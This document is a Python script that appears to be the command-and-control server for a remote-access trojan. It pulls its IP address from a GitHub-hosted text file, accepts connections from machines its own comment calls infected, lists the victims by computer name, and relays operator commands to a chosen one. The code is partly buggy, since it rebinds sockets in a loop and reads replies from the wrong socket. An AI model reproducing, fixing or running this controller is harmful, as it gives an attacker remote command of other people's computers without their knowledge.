import requests
import socket
import threading

user_connections = []
user_names = []
useramount = 0

#handles all new connections and should repeatidly scan for new incoming connections
def newconnection():
    global useramount
    useramount = useramount + 1 #adds one to the user amount
    userlist = client_socket.recv(1024).decode()
    print(f"Connection received from {addr}")
    user_names.append(userlist) #adds the user computer name to the lsit
    user_connections.append((client_socket)) #adds the user socket to the list in the same position that name is for simpliar access
    print(user_connections)
    print(user_names)
    mainmenu() #main menu function  durrr


def handleconnections(*args):
    global addr
    global client_socket
    #creates a constantly running connection
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((hostip, port))
        print(f"Binding to {hostip} on port {port}")
        s.listen(5)
        client_socket, addr = s.accept() #will auto accept any incoming requests
        newconnection()


#main menu function were you check your connected user's you have been infected
def mainmenu():
    for user in user_names:
        print(f"{user}: -> {useramount}")
    connectionbranch = int(input("enter the connection you want: "))
    selected = connectionbranch - 1
    usersocket = user_connections[selected]
    print(usersocket)
    communication(usersocket)  #runs the communication command which i fr dont even need but ill check some more things out


def handle_client(client_socket):
    while True:

        data = client_socket.recv(1024)
        if not data:
            print("Connection closed by client.")
            break
        print(f"Received from client: {data.decode()}") 
        client_socket.sendall(data) 

    client_socket.close()

#server function Durrr
def server():
    global hostip
    global port
    global s
    global client_socket
    link = "https://raw.githubusercontent.com/80dropz/communication/refs/heads/main/ipv4.txt"
    data = requests.get(link)
    hostip = data.text.strip()  #gets the host ip from my link then strips it down to just a raw textfield
    port = 65432
    print(f"Server will listen on {hostip}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#starts the socket
    handleconnections() #runs the handel connections function


def communication(UserSelected):
    while True:
        command = input("Enter a command to send to the client (or type 'exit' to close): ")
        if command.lower() == 'exit':
            print("Closing connection.")
            mainmenu()
        UserSelected.sendall(command.encode())
        print(f"Sent a command to {UserSelected}")
        response = client_socket.recv(1024)
        if not response:
            print("No response from client.")
            break
        print(f"Client response: {response.decode()}")
    s.close()



#Will instantly run the server
if __name__ == "__main__":
    server()
